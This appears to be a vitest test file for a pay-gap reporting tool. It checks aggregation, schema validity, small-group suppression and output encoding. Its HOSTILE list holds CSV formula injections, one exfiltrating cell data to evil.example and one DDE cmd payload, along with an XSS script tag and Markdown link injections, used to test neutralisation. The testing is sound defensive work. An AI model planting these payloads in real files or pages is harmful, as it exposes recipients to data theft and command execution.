// Copyright 2026 MB AFKzona Group
// SPDX-License-Identifier: AGPL-3.0-only

import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { Ajv2020 } from 'ajv/dist/2020.js';
import { describe, expect, it } from 'vitest';
import { parseCsv } from '../src/core/csv.js';
import { buildDataset, type Dataset } from '../src/core/dataset.js';
import { renderCsv } from '../src/report/csv.js';
import { REPORT_CSP, REPORT_CSS, REPORT_CSS_SHA256, renderHtml } from '../src/report/html.js';
import { renderJson } from '../src/report/json.js';
import { renderMarkdown } from '../src/report/markdown.js';
import { buildReport, describeChoices, type ReportV1 } from '../src/report/model.js';
import { config } from './helpers.js';

const HOSTILE = [
  '=HYPERLINK("http://evil.example/?"&A1,"x")',
  '+cmd|\' /C calc\'!A0',
  '-2+3',
  '@SUM(1+1)',
  '<script>alert(1)</script>',
  '[click](http://evil.example)',
  '| injected | cell |',
  'www.evil.example',
  '＝1+1',
];

function dataset(categories: readonly string[], overrides: Record<string, unknown> = {}): { ds: Dataset; cfg: ReturnType<typeof config> } {
  const cfg = config(overrides);
  const rows = ['id,gender,category,basic,bonus,hours'];
  let id = 0;
  for (const cat of categories) {
    const quoted = `"${cat.replace(/"/g, '""')}"`;
    for (let i = 0; i < 5; i++) rows.push(`${++id},F,${quoted},${1000 + i * i},${i},100`);
    for (let i = 0; i < 5; i++) rows.push(`${++id},M,${quoted},${1100 + i * i},${i},100`);
  }
  const t = parseCsv(rows.join('\n'), ',', cfg.csv.limits);
  if (!t.ok) throw new Error(t.error.message);
  const r = buildDataset(t.value, cfg);
  if (!r.ok) throw new Error(r.issues.map((i) => i.message).join());
  return { ds: r.dataset, cfg };
}

function report(categories: readonly string[] = ['Engineering', 'Sales'], options: Partial<Parameters<typeof buildReport>[2]> = {}): ReportV1 {
  const { ds, cfg } = dataset(categories);
  return buildReport(ds, cfg, { generatedAt: '2027-03-01T10:00:00Z', employer: 'Example <Ltd> & Co', currency: 'EUR', ...options });
}

const reportSchema = JSON.parse(readFileSync(new URL('../schema/report-v1.schema.json', import.meta.url), 'utf8')) as object;
const validReport = new Ajv2020({ allErrors: true, strict: true }).compile(reportSchema);

describe('buildReport', () => {
  it('produces JSON that validates against schema/report-v1.schema.json', () => {
    const schema = JSON.parse(readFileSync(new URL('../schema/report-v1.schema.json', import.meta.url), 'utf8')) as object;
    const validate = new Ajv2020({ allErrors: true, strict: true }).compile(schema);
    for (const r of [report(), report(['A'], { suppressSmallGroups: false, submissionDate: '2027-06-07' })]) {
      const parsed: unknown = JSON.parse(renderJson(r));
      expect(validate(parsed), JSON.stringify(validate.errors)).toBe(true);
    }
    const noCategory = dataset(['A'], { columns: { workerId: 'id', gender: 'gender', basicPay: ['basic'], complementaryPay: [], hours: 'hours' } });
    expect(validate(JSON.parse(renderJson(buildReport(noCategory.ds, noCategory.cfg, { generatedAt: '2027-01-01' }))))).toBe(true);
  });

  it('holds aggregates only: no worker ids and no individual amounts', () => {
    const json = renderJson(report());
    const parsed = JSON.parse(json) as Record<string, unknown>;
    expect(Object.keys(parsed)).not.toContain('workers');
    // Women earn basic pay 1000, 1001, 1004, 1009, 1016 (+ components 0–4). Averages and gaps
    // appear, individual pay levels do not. (A median of an odd group is, by definition, one
    // worker's pay level; the directive requires medians, so the middle value 1006 is not checked.)
    for (const individual of ['1000.00', '1002.00', '1012.00', '1020.00', '"w1"', '"1"']) expect(json).not.toContain(individual);
  });

  it('records every configuration choice with its legal basis', () => {
    const choices = describeChoices(config({ annualPay: 'full-time-equivalent', columns: { workerId: 'id', gender: 'gender', basicPay: ['basic'], complementaryPay: [], hours: 'hours', fte: 'fte' } }));
    expect(choices.map((c) => c.setting)).toEqual([
      'payBases',
      'annualPay',
      'columns.hours',
      'columns.basicPay',
      'columns.complementaryPay',
      'columns.category',
      'otherGender',
      'complementaryGapPopulation',
      'quartileMethod',
      'minimumGroupSize',
      'duplicateWorkerRows',
    ]);
    for (const c of choices) expect(c.legalBasisUrl).toMatch(/^https:\/\/eur-lex\.europa\.eu\//);
  });

  it('adds notes for internal mode, tiny minimum sizes, other periods and missing categories', () => {
    expect(report(['A'], { suppressSmallGroups: false }).notes.join()).toMatch(/INTERNAL/);
    const { ds, cfg } = dataset(['A'], { minimumGroupSize: 2 });
    expect(buildReport(ds, cfg, { generatedAt: '2027-01-01' }).notes.join()).toMatch(/below 3/);
    const noCat = dataset(['A'], { columns: { workerId: 'id', gender: 'gender', basicPay: ['basic'], complementaryPay: [], hours: 'hours' } });
    const notes = buildReport(noCat.ds, noCat.cfg, { generatedAt: '2027-01-01' }).notes.join();
    expect(notes).toMatch(/Article 9\(1\)\(g\)/);
    expect(notes).toMatch(/No complementary/);
    const hourly = dataset(['A'], { payBases: ['hourly'], annualPay: undefined });
    expect(buildReport(hourly.ds, hourly.cfg, { generatedAt: '2027-01-01' }).notes.join()).toMatch(/Only hourly pay is shown. Article 3\(1\)\(b\) defines pay level as gross annual pay and the corresponding gross hourly pay/);
    expect(report().notes.join()).not.toMatch(/Article 3\(1\)\(b\)/);
    const other = { ...ds, summary: { ...ds.summary, rowsOtherPeriod: 3 } };
    expect(buildReport(other, cfg, { generatedAt: '2027-01-01' }).notes.join()).toMatch(/3 rows had a different period/);
  });

  it('withholds a small count of workers recorded as neither female nor male', () => {
    const { ds, cfg } = dataset(['A']);
    const withOther = { ...ds, summary: { ...ds.summary, other: 2 } };
    const r = buildReport(withOther, cfg, { generatedAt: '2027-01-01' });
    expect(r.data.other).toBeNull();
    // Totals would give the count away (workers − female − male), so they are withheld too.
    expect(r.data.workers).toBeNull();
    expect(r.data.rowsUsed).toBeNull();
    expect(r.data.dataRows).toBeNull();
    expect(r.notes.join()).toMatch(/Fewer than 5 workers are recorded as neither female nor male/);
    expect(renderMarkdown(r)).toContain('| withheld: small group | withheld: small group |');
    expect(validReport(r)).toBe(true);
    const internal = buildReport(withOther, cfg, { generatedAt: '2027-01-01', suppressSmallGroups: false });
    expect(internal.data.other).toBe(2);
    expect(internal.data.workers).toBe(ds.summary.workers);
    const includeCfg = config({ otherGender: 'include-in-totals' });
    expect(buildReport(withOther, includeCfg, { generatedAt: '2027-01-01' }).notes.join()).toMatch(/left out of the quartile pay bands/);
  });

  it('explains what to do when the Article 10(1)(a) test is withheld', () => {
    // Groups of 5 with a minimum of 6: every category is withheld.
    const { ds, cfg } = dataset(['A'], { minimumGroupSize: 6 });
    const r = buildReport(ds, cfg, { generatedAt: '2027-01-01' });
    const withheld = r.jointPayAssessment.categories.filter((c) => c.conditionA === 'withheld').length;
    expect(withheld).toBeGreaterThan(0);
    expect(r.notes.join()).toMatch(/Article 10 applies whatever the group size/);
    expect(buildReport(ds, cfg, { generatedAt: '2027-01-01', suppressSmallGroups: false }).notes.join()).not.toMatch(/Article 10 applies/);
  });

  it('validates its options', () => {
    const { ds, cfg } = dataset(['A']);
    expect(() => buildReport(ds, cfg, { generatedAt: 'yesterday' })).toThrow(RangeError);
    expect(() => buildReport(ds, cfg, { generatedAt: '2027-01-01', currency: 'eur' })).toThrow(RangeError);
    expect(() => buildReport(ds, cfg, { generatedAt: '2027-01-01', employer: 'A\u0007' })).toThrow(RangeError);
    expect(() => buildReport(ds, cfg, { generatedAt: '2027-01-01', submissionDate: '2027-02-30' })).toThrow(RangeError);
  });
});

describe('output encoding of hostile input', () => {
  const r = report(HOSTILE);

  it('neutralises formulas in CSV output', () => {
    const csv = renderCsv(r);
    const t = parseCsv(csv, ',');
    if (!t.ok) throw new Error(t.error.message);
    const categoryCells = t.value.rows.map((row) => row.fields[2] ?? '').filter((c) => c !== '');
    expect(categoryCells.length).toBeGreaterThan(0);
    for (const cell of categoryCells) {
      // No cell may start with a formula trigger, even after leading whitespace.
      expect(cell, cell).not.toMatch(/^[\s\u3000]*[=+\-@＝＋－＠]/);
    }
    expect(categoryCells).toContain("'=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")");
    expect(categoryCells).toContain("'-2+3");
    // Numeric cells, including negative gaps, are not altered.
    expect(csv).toMatch(/,-?[0-9]+\.[0-9]{2},ok,/);
  });

  it('escapes HTML output and keeps the page script-free under a strict CSP', () => {
    const html = renderHtml(r);
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(html).toContain('Example &lt;Ltd&gt; &amp; Co');
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="${REPORT_CSP}">`);
    expect(REPORT_CSP).toMatch(/^default-src 'none'; style-src 'sha256-/);
    expect(html).toContain('<meta http-equiv="x-dns-prefetch-control" content="off">');
    // Only https links to fixed URLs.
    for (const m of html.matchAll(/href="([^"]*)"/g)) expect(m[1]).toMatch(/^https:\/\/(eur-lex\.europa\.eu\/|github\.com\/afkzonagroup\/|afkzonagroup\.lt$)/);
  });

  it('keeps the stylesheet hash in the CSP in step with the stylesheet', () => {
    expect(createHash('sha256').update(REPORT_CSS, 'utf8').digest('base64')).toBe(REPORT_CSS_SHA256);
  });

  it('escapes Markdown output so input cannot create links, HTML or table cells', () => {
    const md = renderMarkdown(r);
    expect(md).not.toContain('<script>');
    expect(md).not.toContain('[click](http');
    expect(md).not.toContain('www.evil.example');
    expect(md).toContain('\\[click\\]\\(http\\:\\/\\/evil\\.example\\)');
    // Every table row of the gap table keeps 7 columns despite the "|" in a category name.
    const rows = md.split('\n').filter((l) => l.includes('injected'));
    for (const row of rows) expect(row.replace(/\\\|/g, '').split('|').length - 2).toBeGreaterThanOrEqual(5);
  });

  it('carries the attribution in every format', () => {
    expect(renderMarkdown(r)).toContain('[Evenkeel by AFKzona Group](<https://afkzonagroup.lt>)');
    expect(renderHtml(r)).toContain('<footer><a href="https://afkzonagroup.lt" rel="noopener noreferrer">Evenkeel by AFKzona Group</a>');
    expect(renderCsv(r)).toContain('meta,,,,generator,Evenkeel by AFKzona Group 0.1.0,ok,');
    expect(JSON.parse(renderJson(r))).toMatchObject({ generator: { attribution: 'Evenkeel by AFKzona Group' } });
  });
});
